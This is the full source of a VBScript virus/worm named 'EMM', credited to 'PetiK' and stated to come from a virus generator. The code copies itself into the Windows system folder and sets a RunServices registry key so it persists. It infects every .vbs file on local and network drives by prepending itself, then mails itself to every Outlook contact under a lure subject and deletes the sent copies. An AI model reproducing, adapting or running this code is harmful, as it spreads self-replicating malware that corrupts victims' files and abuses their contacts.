   'EMM
   'Name : EMM
   'Author : PetiK
   On Error Resume Next
   Set hbvvnf = CreateObject("Scripting.FileSystemObject")
   Set yaplfo = CreateObject("WScript.Shell")
   Set win = hbvvnf.GetSpecialFolder(0)
   Set sys = hbvvnf.GetSpecialFolder(1)

   copyname = sys&"\emm.dll.vbs"
   hbvvnf.GetFile(WScript.ScriptFullName).Copy(copyname)
   yaplfo.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\emm",copyname

   Set fl = hbvvnf.OpenTextFile(WScript.ScriptFullName, 1)
   virus = fl.ReadAll
   fl.Close
   infectfile()
   Sub infectfile()
   On Error Resume Next
   Set hbvvnf = CreateObject("Scripting.FileSystemObject")
   Set elmq = hbvvnf.Drives
   For Each d In elmq
   If d.DriveType = 2 Or d.DriveType = 3 Then
   list(d.path&"\")
   End If
   Next
   End Sub

   Sub list(doss)
   On Error Resume Next
   Set hbvvnf = CreateObject("Scripting.FileSystemObject")
   Set iyri = hbvvnf.GetFolder(doss)
   Set tnluh = iyri.SubFolders
   For Each f1 In tnluh
   infect(f1.Path)
   list(f1.Path)
   Next
   End Sub

   Sub infect(doss)
   On Error Resume Next
   Set hbvvnf = CreateObject("Scripting.FileSystemObject")
   Set iyri = hbvvnf.GetFolder(doss)
   Set fc = iyri.Files
   For Each f1 In fc
   ext = hbvvnf.GetExtensionName(f1.Path)
   ext = lCase(ext)
   If (ext = "vbs") Then
       Set cot = hbvvnf.OpenTextFile(f1.Path, 1, False)
       If cot.ReadLine <> "'EMM" Then
       cot.Close
       Set cot = hbvvnf.OpenTextFile(f1.Path, 1, False)
       vbsorg = cot.ReadAll()
       cot.Close
       Set inf = hbvvnf.OpenTextFile(f1.Path, 2, True)
       inf.WriteLine virus
       inf.WriteLine ""
       inf.WriteLine (vbsorg)
       inf.Close
       End If
   End If
   Next
   End Sub

   Set mrea = CreateObject("Outlook.Application")
   Set thhy = mrea.GetNameSpace("MAPI")
   For each c In thhy.AddressLists
   If c.AddressEntries.Count <> 0 Then
   For d = 1 To c.AddressEntries.Count
   Set cpvkn = mrea.CreateItem(0)
   cpvkn.To = c.AddressEntries(d).Address
   cpvkn.Subject = "Hey you !!!"
   cpvkn.Body = "This is for you my friend !!!"
   cpvkn.Attachments.Add(copyname)
   cpvkn.DeleteAfterSubmit = True
   If cpvkn.To <> "" Then
   cpvkn.Send
   End If
   Next
   End If
   Next

   'This VBS virus/worm was generated by PVBSWG 1.0
